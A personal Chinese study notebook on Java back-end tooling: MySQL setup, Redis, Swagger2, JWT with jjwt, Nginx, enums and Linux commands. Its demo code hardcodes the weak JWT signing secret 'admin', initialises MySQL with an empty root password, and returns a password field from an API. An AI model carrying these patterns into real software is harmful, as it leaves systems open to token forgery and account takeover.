## MYSQL的安装卸载

**安装**

- 从[MySQL官网](http://dev.mysql.com/downloads/mysql)下载zip压缩包并解压到自定义安装位置，这里为C:\Program Files\MySQL\mysql-8.0.23-winx64
- 复制MySQL文件夹下的bin文件夹路径，这里为C:\Program Files\MySQL\mysql-8.0.23-winx64\bin
- 右键 -> 我的电脑 -> 属性 -> 高级系统设置 -> 环境变量，在系统变量中找到PATH并编辑，点击新建并粘贴我们上面复制的路径，依次点击确定退出
- 以管理员身份打开cmd，输入以下命令：

```sql
mysqld --initialize-insecure    #创建data目录并填充mysql系统模式中的表来初始化MySQL安装
mysqld --install [serviceName]   #serviceName为可选项 不输入默认为MySQL
net start mysql           		#安装成功后启动服务
mysqladmin -uroot password yourpass #yourpass 为自己设置的MySQL密码 不执行则默认密码为空
```

**卸载**

卸载前可以备份所有数据库到一个sql文件

```sql
mysqldump -uroot -p --all-databases > sqlfile.sql
```

执行以下命令可以进行数据库文件的导入

```sql
source d:\sqlfile.sql  # d:\sqlfile.sql为要导入sql文件路径
```

执行以下命令进行卸载

```sql
net stop mysql      #mysql为自己安装的mysql服务名称 默认为mysql
mysqld --remove mysql #mysql为自己安装的mysql服务名称 默认为mysql
```

---

以上是一种操作，以下是DXC实习生培训提供的操作文档

> 打开刚刚解压的文件夹 **C:\web\mysql-8.0.11** ，在该文件夹下创建 **my.ini** 配置文件，编辑 **my.ini** 配置以下基本信息：
>
> ```ini
> [client]
> # 设置mysql客户端默认字符集
> default-character-set=utf8
> 
> [mysqld]
> # 设置3306端口
> port = 3306
> 
> # 设置mysql的安装目录
> basedir=C:\\web\\mysql-8.0.11
> 
> # 设置 mysql数据库的数据的存放目录，MySQL 8+ 不需要以下配置，系统自己生成即可，否则有可能报错
> # datadir=C:\\web\\sqldata
> 
> # 允许最大连接数
> max_connections=20
> 
> # 服务端使用的字符集默认为8比特编码的latin1字符集
> character-set-server=utf8
> 
> # 创建新表时将使用的默认存储引擎
> default-storage-engine=INNODB
> ```
>
> 
>
> **接下来我们来启动下 MySQL 数据库**
>
> 以管理员身份打开 cmd 命令行工具，切换目录：
>
> `cd C:\web\mysql-8.0.11\bin`
>
> 初始化数据库：
>
> `mysqld --initialize --console`
>
> 执行完成后，会输出 root 用户的初始默认密码，如：
>
> ```shell
> ...
> 
> 2018-04-20T02:35:05.464644Z 5 [Note] [MY-010454] [Server] A temporary password is generated for root@localhost: APWCY5ws&hjQ
> 
> ...
> ```
>
> `APWCY5ws&hjQ `就是初始密码，后续登录需要用到，你也可以在登陆后修改密码。
>
> 输入以下安装命令：
>
> `mysqld install`
>
> 启动输入以下命令即可：
>
> `net start mysql`
>
> *注意:* *在* *5.7* *需要初始化* *data* *目**录**：*
>
> ```
> cd C:\web\mysql-8.0.11\bin 
> 
> mysqld --initialize-insecure 
> ```
>
> 初始化后再运行`net start mysql `即可启动 mysql。
>
> 
>
> **登录 **MySQL
>
> 当 MySQL 服务已经运行时, 我们可以通过 MySQL 自带的客户端工具登录到 MySQL 数据库中, 首先打开命令提示符, 输入以下格式的命名:
>
> `mysql -h 主机名 -u 用户名 -p`
>
> 参数说明：
>
> > ·    **-h** : 指定客户端所要登录的 MySQL 主机名, 登录本机(localhost 或 127.0.0.1)该参数可以省略;
> >
> > ·    **-u** : 登录的用户名;
> >
> > ·    **-p** : 告诉服务器将会使用一个密码来登录, 如果所要登录的用户名密码为空, 可以忽略此选项。
>
> 如果我们要登录本机的 MySQL 数据库，只需要输入以下命令即可：
>
> `mysql -u root -p`
>
> 按回车确认, 如果安装正确且 MySQL 正在运行, 会得到以下响应:
>
> `Enter password:`
>
> 若密码存在, 输入密码登录, 不存在则直接按回车登录。登录成功后你将会看到 Welcome to the MySQL monitor... 的提示语。
>
> 然后命令提示符会一直以 **mysq>** 加一个闪烁的光标等待命令的输入, 输入 `exit` 或 `quit` 退出登录。





## Redis

Redis就是一个能够将信息\数据保存在内存中的缓存数据库

Redis的特质

- Redis是一个缓存数据库,将数据保存在当前服务器的内存中,所以速度非常快
- 虽然Reids是一个内存数据库,但是它允许将Redis中的数据保存在硬盘上,形成备份,以免突然断电丢失数据,计算机重启后可以恢复数据
- Redis保存数据使用键值对(key-value)格式,原理和java的Map类似，使用时可以将Redis认知为一个程序外部的大型Map。
- Redis也叫非关系型数据库，nosql
- Redis保存的数据支持各种类型,最常用的是string
- Redis为了承载更高的并发,支持分布式部署,以达到"高并发,高可用,高性能"的目的



### redis安装

软件解压![image-20211110104815639](Akio's Book.assets/image-20211110104815639.png)

解压后

![image-20211110105152964](Akio's Book.assets/image-20211110105152964.png)

我们仅需操作1，2，这样就可以每次开机自启动

redis默认端口6379



### SpringBoot + Redis

参考视频
https://www.bilibili.com/video/BV1S54y1R7SB?from=search&seid=5424077080837880960&spm_id_from=333.337.0.0	（待看）

https://www.bilibili.com/video/BV1844y1z7LQ/?spm_id_from=autoNext	（待看）

参考文章

https://www.cnblogs.com/zeng1994/p/03303c805731afc9aa9c60dbbd32a323.html





## swagger2

先了解前后端分离

Vue+SpringBoot

- 后端:后端控制层,服务层,数据访问层【后端团队】
- 前端:前端控制层,视图层【前端团队】
  - 伪造后端数据,json。已经存在了,不需要后端,前端工程依旧能够跑起来
- 前端后如何交互?===>API
- 前后端相对独立,松耦合;
- 前后端甚至可以部署在不同的服务器上

产生一个问题：

- 前后端集成联调,前端人员和后端人员无法做到“即使协商,尽早解决″,最终导致问题集中爆发;

解决方案：

- 首先指定 schema[计划的提纲],实时更新最新API,降低集成的风险;
- 早些年:指定word计划文档
- 前后端分离
  - 前端测试后端接口: postman
  - 后端提供接口,需要实时更新最新的消息及改动



然后swagger应运而生



### Swagger2

- 世界上最流行的API框架
- RestFul Api文档自动生成工具--》== API文档和API定义同步更新 ==

- 直接运行，可以在线测试API接口
- 支持多种语言（java，php）

- https://swagger.io/



于项目中使用Swagger 的SpringFox

- Swagger2

- Swagger ui

- https://mvnrepository.com/search?q=springfox

  ![image-20211110115330852](Akio's Book.assets/image-20211110115330852-16365167209202.png)



### springboot集成swagger2

1、创建一个SpringBoot项目，同时加入web依赖

![image-20211110115730656](Akio's Book.assets/image-20211110115730656-16365167140011.png)

2、导入依赖

```xml
<!-- https://mvnrepository.com/artifact/io.springfox/springfox-swagger2 -->
<dependency>
    <groupId>io.springfox</groupId>
    <artifactId>springfox-swagger2</artifactId>
    <version>2.9.2</version>
</dependency>
<!-- https://mvnrepository.com/artifact/io.springfox/springfox-swagger-ui -->
<dependency>
    <groupId>io.springfox</groupId>
    <artifactId>springfox-swagger-ui</artifactId>
    <version>2.9.2</version>
</dependency>
```

3、编写一个HelloController

![image-20211113163812386](Akio's Book.assets/image-20211113163812386.png)

~~~java
@RestController
public class HelloController {
    @RequestMapping(value = "/hello")
    public String hello(){
        return "hello";
    }
}
~~~



4、配置SwaggerConfig

![image-20211113164246976](Akio's Book.assets/image-20211113164246976.png)

~~~java
@Configuration
@EnableSwagger2 //开启Swagger2
public class SwaggerConfig {
    
}
~~~



5、测试运行

http://localhost:8080/swagger-ui.html

<img src="Akio's Book.assets/image-20211113164644954.png" alt="image-20211113164644954" />





### 配置Swagger2基本信息

1、Swagger实例Bean是Docket，所以通过配置Docket实例来配置Swaggger。

```java
@Bean //配置docket以配置Swagger具体参数
public Docket docket() {
   return new Docket(DocumentationType.SWAGGER_2);
}
```

2、可以通过apiInfo()属性配置文档信息

```java
//配置文档信息
private ApiInfo apiInfo() {
   Contact contact = new Contact("联系人名字", "http://xxx.xxx.com/联系人访问链接", "联系人邮箱");
   return new ApiInfo(
           "Swagger学习", // 标题
           "学习演示如何配置Swagger", // 描述
           "v1.0", // 版本
           "http://terms.service.url/组织链接", // 组织链接
           contact, // 联系人信息
           "Apach 2.0 许可", // 许可
           "许可链接", // 许可连接
           new ArrayList<>()// 扩展
  );
}
```

3、Docket 实例关联上 apiInfo()

```java
@Bean
public Docket docket() {
   return new Docket(DocumentationType.SWAGGER_2).apiInfo(apiInfo());//apiInfo()即是第二步方法
}
```

完整版代码

![image-20211113170428886](Akio's Book.assets/image-20211113170428886.png)

![image-20211113170235886](Akio's Book.assets/image-20211113170235886.png)



### 配置扫描接口

1、构建Docket时通过select()方法配置怎么扫描接口。

```java
@Bean
public Docket docket() {
   return new Docket(DocumentationType.SWAGGER_2)
      .apiInfo(apiInfo())
      .select()// 通过.select()方法，去配置扫描接口,RequestHandlerSelectors配置如何扫描接口
       			//RequestHandlerSelectors:配置要扫描接口的方式
                //basePackage:指定要扫描的包
                //any():扫描全部
                //none():不扫描
                //withClassAnnotation:扫描类上的注解，参数是一个注解的反射对象
                //withMethodAnnotation:扫描方法上的注解
      .apis(RequestHandlerSelectors.basePackage("com.akio.swagger.demo.controller"))
      .build();
}
```

2、重启项目测试，由于我们配置根据包的路径扫描接口，所以我们只能看到一个类

3、除了通过包路径配置扫描接口外，还可以通过配置其他方式扫描接口，这里注释一下所有的配置方式：

```java
any() // 扫描所有，项目中的所有接口都会被扫描到
none() // 不扫描接口
// 通过方法上的注解扫描，如withMethodAnnotation(GetMapping.class)只扫描get请求
withMethodAnnotation(final Class<? extends Annotation> annotation)
// 通过类上的注解扫描，如.withClassAnnotation(Controller.class)只扫描有controller注解的类中的接口
withClassAnnotation(final Class<? extends Annotation> annotation)
basePackage(final String basePackage) // 根据包路径扫描接口
```

4、除此之外，我们还可以配置接口扫描过滤：

```java
@Bean
public Docket docket() {
   return new Docket(DocumentationType.SWAGGER_2)
      .apiInfo(apiInfo())
      .select()// 通过.select()方法，去配置扫描接口,RequestHandlerSelectors配置如何扫描接口
      .apis(RequestHandlerSelectors.basePackage("com.akio.swagger.demo.controller"))
       // 配置如何通过path过滤,即这里只扫描请求以/hello开头的接口
      .paths(PathSelectors.ant("/hello/**"))//controller的路径
      .build();
}
```

5、这里的可选值还有

```
any() // 任何请求都扫描
none() // 任何请求都不扫描
regex(final String pathRegex) // 通过正则表达式控制
ant(final String antPattern) // 通过ant()控制
```

![Image](Akio's Book.assets/640.webp)





### 配置开关

1、通过enable()方法配置是否启用swagger，如果是false，swagger将不能在浏览器中访问了

```java
@Bean
public Docket docket() {
   return new Docket(DocumentationType.SWAGGER_2)
      .apiInfo(apiInfo())
      .enable(false) //配置是否启用Swagger，如果是false，在浏览器将无法访问
      .select()// 通过.select()方法，去配置扫描接口,RequestHandlerSelectors配置如何扫描接口
      .apis(RequestHandlerSelectors.basePackage("com.akio.swagger.demo.controller"))
       // 配置如何通过path过滤,即这里只扫描请求以/hello开头的接口
      .paths(PathSelectors.ant("/hello/**"))//controller的路径
      .build();
}
```

2、如何动态配置当项目处于test、dev环境时显示swagger，处于prod时不显示？

![image-20211113215030992](Akio's Book.assets/image-20211113215030992.png)

```java
@Bean
public Docket docket(Environment environment) {
   // 设置要显示swagger的环境
   Profiles of = Profiles.of("dev", "test");
   // 判断当前是否处于该环境
   // 通过 enable() 接收此参数判断是否要显示
   boolean flag = environment.acceptsProfiles(of);
   
   return new Docket(DocumentationType.SWAGGER_2)
      .apiInfo(apiInfo())
      .enable(flag) //配置是否启用Swagger，如果是false，在浏览器将无法访问
      .select()// 通过.select()方法，去配置扫描接口,RequestHandlerSelectors配置如何扫描接口
      .apis(RequestHandlerSelectors.basePackage("com.akio.swagger.demo.controller"))
       // 配置如何通过path过滤,即这里只扫描请求以/hello开头的接口
      .paths(PathSelectors.ant("/hello/**"))//controller的路径
      .build();
}
```

3、可以在项目中增加一个dev的配置文件查看效果！

![image-20211113215042300](Akio's Book.assets/image-20211113215042300.png)





### 配置API分组

1、如果没有配置分组，默认是default。通过groupName()方法即可配置分组：

```java
@Bean
public Docket docket(Environment environment) {
   return new Docket(DocumentationType.SWAGGER_2)
      .apiInfo(apiInfo())
      .groupName("Akio's group") // 配置分组
       // 省略配置....
}
```

2、重启项目查看分组

![image-20211113215345703](Akio's Book.assets/image-20211113215345703.png)

3、如何配置多个分组？配置多个分组只需要配置多个docket即可：

```java
@Bean
public Docket docket1(){
   return new Docket(DocumentationType.SWAGGER_2).groupName("group1");
}
@Bean
public Docket docket2(){
   return new Docket(DocumentationType.SWAGGER_2).groupName("group2");
}
@Bean
public Docket docket3(){
   return new Docket(DocumentationType.SWAGGER_2).groupName("group3");
}
```

4、重启项目查看即可



### 配置实体类

1、新建一个实体类

![image-20211113215625665](Akio's Book.assets/image-20211113215625665.png)

```java
@ApiModel("用户实体")
public class User {
   @ApiModelProperty("用户名")
   public String username;
   @ApiModelProperty("密码")
   public String password;
}
```

2、只要这个实体在**请求接口**的返回值上（即使是泛型），都能映射到实体项中：

```java
@RequestMapping("/getUser")
public User getUser(){
   return new User();
}
```

3、重启查看测试

![image-20211113215811648](Akio's Book.assets/image-20211113215811648.png)

注：并不是因为@ApiModel这个注解让实体显示在这里了，而是只要出现在接口方法的返回值上的实体都会显示在这里，而@ApiModel和@ApiModelProperty这两个注解只是为实体添加注释的。

@ApiModel为类添加注释

@ApiModelProperty为类属性添加注释



### 常用注解

Swagger的所有注解定义在io.swagger.annotations包下

下面列一些经常用到的，未列举出来的可以另行查阅说明：

| Swagger注解                                                  | 简单说明                                                     |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| @Api(tags = "xxx模块说明")                                   | 作用在模块类上                                               |
| @ApiOperation("xxx接口说明")                                 | 作用在接口方法上                                             |
| @ApiModel("xxxPOJO说明")                                     | 作用在模型类上：如VO、BO                                     |
| @ApiModelProperty(value = "xxx属性说明",hidden = true)       | 作用在类方法和属性上，hidden设置为true可以隐藏该属性         |
| @ApiParam("xxx参数说明")                                     | 作用在参数、方法和字段上，类似@ApiModelProperty              |
| @ApiImplicitParams({})                                       | 作用于方法上，表示方法所有参数的集合                         |
| @ApiImplicitParam(name = "id", value = "合同ID", dataType = "String", paramType = "path") | 作用于@ApiImplicitParams注解中，表示方法的一个参数信息<br/>![image-20211115211134831](Akio's Book.assets/image-20211115211134831.png) |

更多注解详解 https://blog.csdn.net/jiangyu1013/article/details/83107255

我们也可以给请求的接口配置一些注释

```java
@ApiOperation("Akio的接口")
@PostMapping("/akio")
@ResponseBody
public String kuang(@ApiParam("这个名字会被返回")String username){
   return username;
}
```



### 小结

在正式环境要记得关闭Swagger，一来出于安全考虑二来也可以节省运行时内存。

此章节《Swagger》来自https://mp.weixin.qq.com/s/0-c0MAgtyOeKx6qzmdUG0w



## ApiDoc

https://apidocjs.com/



## JWT

https://www.bilibili.com/video/BV1cK4y197EM?spm_id_from=333.999.0.0

> 什么是JWT？
>
> JSON Web Token，通过数字签名的方式，以JSON对象为载体，在不同的服务终端之间安全的传输信息。

> JWT有什么用？
>
> JWT最常见的场景就是授权认证,一旦用户登录,后续每个请求都将包含JWT,系统在每次处理用户请求的之前,都要先进行JWT安全校验,通过之后再进行处理

> JWT的组成
>
> JWT由3部分组成，用.拼接，例如
>
> ~~~java
> eyhbGcioiJIUZIINiIsInRSCCI6IkpXVCJ9.eyJ1c2VybmFtZsI6IIRvbSIsInJvbGUTohzGlpbiIsInNlYiI6ImFkbWluLXRIc3Q1LCJleHA2NZUSImpOasI6Imo2MTZjCxLWI5ZmUtNGMWNy04MzQLTVioWViJ9.FOS9Y7rYNdc2AoidnSPrgg2XTYePUOyGZ598h2gtab
> ~~~
>
> 这三部分分别是：
>
> - Header，进行Base64的加密就变成了第一部分
>
>   ~~~json
>   {
>   	'typ': 'JWT',
>   	'alg': 'HS256'
>   }
>   ~~~
>
> - Payload
>
>   ~~~json
>   {
>       "sub": '1234567890',
>       "name": 'john',
>       "admin": true
>   }
>   ~~~
>
> - Signature（签名）
>
>   ~~~json
>   var encodedString = base64UrlEncode(header)+'.'+base64UrlEncode(payload);
>   var signature = HMACSHA256(encodedString,'secret');
>   ~~~

> 实战使用JWT
>
> 1、先导入pom.xml
>
> ```xml
> <dependency>
>  <groupId>io.jsonwebtoken</groupId>
>  <artifactId>jjwt</artifactId>
>  <version>0.9.1</version>
> </dependency>
> //如果JDK1.8以上，下面这些依赖要加上
> <dependency>
>  <groupId>javax.xml.bind</groupId>
>  <artifactId>jaxb-api</artifactId>
>  <version>2.3.0</version>
> </dependency>
> <dependency>
>  <groupId>com.sun.xml.bind</groupId>
>  <artifactId>jaxb-impl</artifactId>
>  <version>2.3.0</version>
> </dependency>
> <dependency>
>  <groupId>com.sun.xml.bind</groupId>
>  <artifactId>jaxb-core</artifactId>
>  <version>2.3.0</version>
> </dependency>
> <dependency>
>  <groupId>javax.activation</groupId>
>  <artifactId>activation</artifactId>
>  <version>1.1.1</version>
> </dependency>
> ```
>
> 2、测试代码
>
> ~~~java
> @SpringBootTest
> class SwaggerDemoApplicationTests {
> 
>  private long time = 1000*60*60*24;
>  private String signature = "admin";//签名
> 
>  @Test
>  public void jwt(){
>      //加密
>      JwtBuilder jwtBuilder = Jwts.builder();
>      String jwtToken = jwtBuilder
>              //header
>              .setHeaderParam("typ", "JWT")
>              .setHeaderParam("alg", "HS256")
>              //payload
>              .claim("username", "Akio")
>              .claim("role", "admin")
>              .setSubject("admin-test")
>              .setExpiration(new Date(System.currentTimeMillis()+time))//令牌过期时间
>              .setId(UUID.randomUUID().toString())
>              //signature
>              .signWith(SignatureAlgorithm.HS256, signature)
>              .compact();//拼接
>      System.out.println(jwtToken);
>      //为以上信息生成了一个独一无二的令牌，这个令牌唯一指定这个用户
>  }
> 
>  @Test
>  public void parse(){
>      //上面程序生成的令牌
>      String token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRvbSIsInJvbGUiOiJhZG1pbiIsInN1YiI6ImFkbWluLXRlc3QiLCJleHAiOjE2MzY5MDUyNDksImp0aSI6ImVhMzhjMGJjLTAzZGYtNGViYi1iMmZlLTNjNzk1OTEzZTJhMyJ9.LL7FFJBxy3j6aJVir8iwf1kFStjqnlr9k_c309E2ROA";
>      //解密
>      JwtParser jwtParser = Jwts.parser();
>      Jws<Claims> claimsJws = jwtParser.setSigningKey(signature).parseClaimsJws(token);//根据签名解析token信息
>      Claims claims = claimsJws.getBody();
>      System.out.println(claims.get("username"));
>      System.out.println(claims.get("role"));
>      System.out.println(claims.getId());
>      System.out.println(claims.getSubject());
>      System.out.println(claims.getExpiration());
>  }
> }
> ~~~
>
> ![image-20211114000109577](Akio's Book.assets/image-20211114000109577.png)





## SpringBoot + JWT +VUE

https://www.bilibili.com/video/BV1Kf4y187Fz/?spm_id_from=autoNext

![image-20211114103852775](Akio's Book.assets/image-20211114103852775.png)

把JWT的加密和解密认证作为一个util工具类来使用

> ~~~java
> public class JwtUtil {
> 
>  private static long time = 1000*60*60*24;
>  private static String signature = "admin";//签名
> 
>  public static String createToken(){
>      //加密
>      JwtBuilder jwtBuilder = Jwts.builder();
>      String jwtToken = jwtBuilder
>              //header
>              .setHeaderParam("typ", "JWT")
>              .setHeaderParam("alg", "HS256")
>              //payload
>              .claim("username", "Akio")
>              .claim("role", "admin")
>              .setSubject("admin-test")
>              .setExpiration(new Date(System.currentTimeMillis()+time))//令牌过期时间
>              .setId(UUID.randomUUID().toString())
>              //signature
>              .signWith(SignatureAlgorithm.HS256, signature)
>              .compact();//拼接
>      System.out.println(jwtToken);
>      //为以上信息生成了一个独一无二的令牌，这个令牌唯一指定这个用户
>      return jwtToken;
>  }
> 
>  public static boolean checkToken(String token){
>      if (token == null){
>          return false;
>      }
>      try {
>          Jws<Claims> claimsJws = Jwts.parser().setSigningKey(signature).parseClaimsJws(token);
>      } catch (Exception e) {
>          return false;
>      }
>      return true;
>  }
> }
> ~~~





## VO POJO Dto

![image-20211111093816724](Akio's Book.assets/image-20211111093816724.png)

VO->是视图层对象。作用是给视图页面的数据封装。
PO->是持久层对象，作用就是跟持久层的数据作一一对应的关系，相当于一张表一个类，每张表的字段就是每个PO类的属性；
DTO->是数据传输对象，主要用于数据传输，比如我们有一个表，含有十几个字段，那么对应的 PO 就有十几个属性，但我们只需要5 个字段，因此没有必要把整个 PO 对象传递过去，我们只需把5 个属性的 DTO 把结果传递过去即可；

比如一个用户在页面操作数据，发出了一个请求。
刚开始数据在页面上展示时候均为VO；VO 的数据是跟页面一一对应。
VO在传到服务层之前，需要将VO转换成DTO再传给服务层。这里转DTO原因之前说了，比如页面有几十个字段，我只要其中几个。没有必要全部给我，所以是转DTO来传输。
然后根据DTO传过来的数据，我们会构造出一个BO，也就是业务逻辑对象，一般在Business这个包。在BO这一段我们会完成具体的业务逻辑。业务逻辑完成后，数据你需要更新到数据库吧？
所以，此时BO的数据就需要转换成对应的PO，因为一个PO对应一张表，所以需要用PO去完成数据的持久化。





## 各种Mapping详解\Restful风格

https://www.cnblogs.com/muxi0407/p/11599570.html

@GetMapping、@PostMapping、@PutMapping、@DeleteMapping、@PatchMapping、@RequestMapping

| *Mapping       | 用处                                                         |
| -------------- | ------------------------------------------------------------ |
| @GetMapping    | 处理get请求，传统的RequestMapping来编写应该是<br/>`@RequestMapping(value = “/get/{id}”, method = RequestMethod.GET)`<br/>新方法可以简写为：<br/>`@GetMapping("/get/{id}")` |
| @PostMapping   | 处理post请求，传统的RequestMapping来编写应该是<br/>`@RequestMapping(value = “/get/{id}”,method = RequestMethod.POST)`<br/>新方法可以简写为：<br/>`@PostMapping("/get/{id}")` |
| @PutMapping    | 和PostMapping作用等同，都是用来向服务器提交信息。如果是添加信息，倾向于用@PostMapping，如果是更新信息，倾向于用@PutMapping。两者差别不是很明显。 |
| @DeleteMapping | 删除URL映射                                                  |
| @PatchMapping  | 一般不用                                                     |





## Nginx

### 装载启动

https://nginx.org/en/download.html

软件下载，下载Stable version稳定版

![image-20211115160056014](Akio's Book.assets/image-20211115160056014.png)

解压后，将前端打包好的项目放进来（方便操作）

![image-20211115160925202](Akio's Book.assets/image-20211115160925202.png)

然后修改conf中的nginx.conf，将root的路径改为打包好的项目的路径，注意看到默认端口是80

![image-20211115163243200](Akio's Book.assets/image-20211115163243200.png)

![image-20211115163309135](Akio's Book.assets/image-20211115163309135.png)

保存后，访问`http://localhost/`即可访问打包好的项目

![image-20211115163837322](Akio's Book.assets/image-20211115163837322.png)



### 命令

> 启动
>
> 直接点击Nginx目录下的nginx.exe    或者    当前路径下的cmd命令运行start nginx

> 关闭
>
> nginx -s stop    或者    nginx -s quit
>  stop表示立即停止nginx,不保存相关信息
>  quit表示正常退出nginx,并保存相关信息

> 重启
>
> (因为改变了配置,需要重启)
>  nginx -s reload

> 注意：以上命令均需要到nginx的路径的cmd下运行，他暂时没有全局命令（除非将其设置到全局）
>
> ![image-20211116092752301](Akio's Book.assets/image-20211116092752301.png)







## Windows中杀死指定端口

1、查询端口占用`netstat -aon|findstr "8080"`

2、 强行杀死进程`taskkill /pid 16744 -t -f`

![image-20211117095420806](Akio's Book.assets/image-20211117095420806.png)





## 微信支付V3

### 导入依赖

要求你先配置为阿里云的镜像仓库(.m2文件夹下)

```xml
<dependency>
    <groupId>com.github.wechatpay-apiv3</groupId>
    <artifactId>wechatpay-apache-httpclient</artifactId>
    <version>0.2.3</version>
</dependency>
```







## 枚举类型

https://www.bilibili.com/video/BV1QK4y1S7LP?from=search&seid=13324217044397930595&spm_id_from=333.337.0.0

### 1、枚举类型的基本使用

##### **常量项需求**

在系统中有一些变量它具有固定的取值范围,比如:学生类的性别属性包括男、女两个值；商城的支付方式包括微信支付、支付宝支付、银联支付三种方式等，在程序中对这些取值通常用常量来表示，因为它们是固定在一定范围内的，如下代码是支付类中支付方式的的表示方式：

~~~java
public class PayFactory {
    //微信支付类型
    public static final String weixinPayType = "weixin";
    //微信支付接口地址
    public static final String weixinPayUrl = "https://api.mch.weixin.qq.com/pay/";

    //支付宝支付类型
    public static final String aliPayType = "ali";
    //支付宝支付接口地址
    public static final String aliPayUrl = "https://openapi.alipay.com";

    //根据支付类型获取支付服务对象
    public static Pay getPay(String PayType){
        Pay pay = null;
        switch(payType){
            case PayFactory.weixinPayType:
                //构造微信支付对象...
                break;
            case PayFactory.aliPayType:
                //构造支付宝支付对象...
                break;
            default:
                break;
        }
        return pay;
    }
}
~~~

以上使用常量来表示支付方式相关的数据存在以下问题：

1、代码不够简洁
		PayFactory工厂类中光常量的配置都占据一般的代码，不方便阅读

2、不能很好的对数据进行分类
		支付类型和支付接口地址靠人工命名关联在一起容易出错，常量越多越不方便管理

对于大型项目的开发类似的配置有很多,如果有一种简洁、分类配置常量的方式将会大大提高我们的生产效率



##### 枚举类型介绍

java中对常量数据的配置可以使用枚举类型实现，枚举类型是面向对象中的一种类型，它也有对象、属
性、方法等，所以它非常方便定义，枚举类型将它的对象(实例)设置为常量方便读取和使用。

枚举类型定义格式如下:

~~~java
//定义枚举类型要使用的关键字enum
public enum 枚举类名 {
    枚举项1, 枚举项2, 枚举项3...;
    成员变量
    构造方法
    成员方法getter/setter
}
~~~

~~~java
public enum PayEnum {
    //枚举项，采用全部大写命名
    //枚举项就是一个一个对象，他是常量，可定义枚举项的时候调用构造方法
    WEIXINPAY("weixin","https://api.mch.weixin.qq.com/pay/"),
    ALIPAY("ali","https://openapi.alipay.com");

    private String name;//支付名称
    private String payUrl;//支付接口地址

    //定义构造方法，枚举类型构造方法是private
    private PayEnum() {
    }

    private PayEnum(String name, String payUrl) {
        this.name = name;
        this.payUrl = payUrl;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {//看你定义的场景，有时候，可以不提供set方法
        this.name = name;
    }

    public String getPayUrl() {
        return payUrl;
    }

    public void setPayUrl(String payUrl) {
        this.payUrl = payUrl;
    }
}
~~~

~~~java
public static void main(String[] args) {
        PayEnum.WEIXINPAY.getName();
        PayEnum.WEIXINPAY.getPayUrl();
    	
    	//枚举项就是一个对象（实例）
        PayEnum alipay = PayEnum.ALIPAY;
        //枚举项之间使用==进行比较,基本数据类型比较值；引用数据类型比较地址
        System.out.println(alipay == PayEnum.ALIPAY);//true
    }
//这样就可以直接获取
~~~

说明如下：
1、每个枚举类型继承java.lang.Enum, 所以枚举类不能再继承其它类型
2、枚举项就是枚举类型的对象(实例),一般使用大写字母,一个枚举项表示一个常量项,多个枚举项中间用逗号分隔。
3、枚举类型的构造方法使用private私有。
4、通过"`枚举类名.枚举项名称`"去访问指定的枚举项。



##### 枚举类实现接口

枚举类型虽然不能继承其他类但是可以实现一个或多个接口，这个在生产使用中较多

```java
接口
public interface SystemCode {
    //系统代码
    int getCode();

    //系统代码对应的描述
    String getDesc();
}
```

~~~java
public enum CodeEnum implements SystemCode {
    SUCCESSFUL(1,"操作成功"),
    ERROR(-1,"系统异常");

    private CodeEnum(int code, String desc) {
        this.code = code;
        this.desc = desc;
    }

    int code;//系统代码
    String desc;//对应描述

    public int getCode() {
        return code;
    }

    public String getDesc() {
        return desc;
    }
}
~~~

~~~java
public static void main(String[] args) {
        //枚举类型可以向上转型为接口类型
        SystemCode code = CodeEnum.SUCCESSFUL;
        System.out.println(code.getCode());
        System.out.println(code.getDesc());
    }
~~~

对于第二点中我们知道了枚举项之间使用==进行比较，所以我们可以使用新的bean工厂

```java
public class PayFactory {
    
    //根据支付类型获取支付服务对象
    public static Pay getPay(PayEnum payEnum){《《《
        //支付对象
        Pay pay = null;
        switch(payEnum){
            case WEIXINPAY://这里要匹配枚举项
                //构造微信支付对象...
                break;
            case ALIPAY:
                //构造支付宝支付对象...
                break;
            default:
                break;
        }
        return pay;
    }
}

main{
    //将枚举项传入工厂方法
    Pay p = PayFactory.getPay(PayEnum.WEIXINPAY);
}
```







## 解决高版本JDK中sun.misc包报错的问题

https://blog.csdn.net/qq_29178991/article/details/79666924

~~~java
import sun.misc.BASE64Encoder;
import sun.misc.BASE64Decoder;
~~~

在项目中，设计到64位编码的。有时开发会用到JDK中自带的BASE64工具。但sun公司是建议不这样做的。尤其是更新了JDK版本，项目甚至还存在保存的信息。可引用`import org.apache.commons.codec.binary.Base64;`进行替换

| `import sun.misc.BASE64Encoder;`<br/>`import sun.misc.BASE64Decoder;` | >    | `import org.apache.commons.codec.binary.Base64;`    |
| ------------------------------------------------------------ | ---- | --------------------------------------------------- |
| `return new  BASE64Encoder().encode(encrypted);`             | >    | `return Base64.encodeBase64String(encrypted);`      |
| `byte[] encrypted1 = new BASE64Decoder().decodeBuffer(text);` | >    | `byte[] encrypted1 =Base64.decodeBase64(text);	` |





## Linux指令大全

#### 1、基本文件操作命令

![image-20211120103821211](Akio's Book.assets/image-20211120103821211.png)

![image-20211120103918941](Akio's Book.assets/image-20211120103918941.png)

![image-20211120104029469](Akio's Book.assets/image-20211120104029469.png)



#### 2、权限管理

![image-20211120104315395](Akio's Book.assets/image-20211120104315395.png)



#### 3、文件搜索

![image-20211120111100070](Akio's Book.assets/image-20211120111100070.png)

![image-20211120104625928](Akio's Book.assets/image-20211120104625928.png)



#### 4、压缩

![image-20211120104726924](Akio's Book.assets/image-20211120104726924.png)





#### 5、网络通信与输入输出重定向，管道，命令替换符

![image-20211120104803467](Akio's Book.assets/image-20211120104803467.png)

![image-20211120105035163](Akio's Book.assets/image-20211120105035163.png)



#### 6、文本编辑命令

书接上集

![image-20211120105113210](Akio's Book.assets/image-20211120105113210.png)

![image-20211120105151483](Akio's Book.assets/image-20211120105151483.png)



#### 7、Linux软件包管理

书接上集

![image-20211120105230569](Akio's Book.assets/image-20211120105230569.png)

![image-20211120105344094](Akio's Book.assets/image-20211120105344094.png)



#### 8、用户管理

![image-20211120105441763](Akio's Book.assets/image-20211120105441763.png)

![image-20211120105606118](Akio's Book.assets/image-20211120105606118.png)

![image-20211120105706101](Akio's Book.assets/image-20211120105706101.png)

![image-20211120105735937](Akio's Book.assets/image-20211120105735937.png)



#### 9、进程

书接上集

![image-20211120105839974](Akio's Book.assets/image-20211120105839974.png)

![image-20211120105922272](Akio's Book.assets/image-20211120105922272.png)



#### 10、计划任务

书接上集

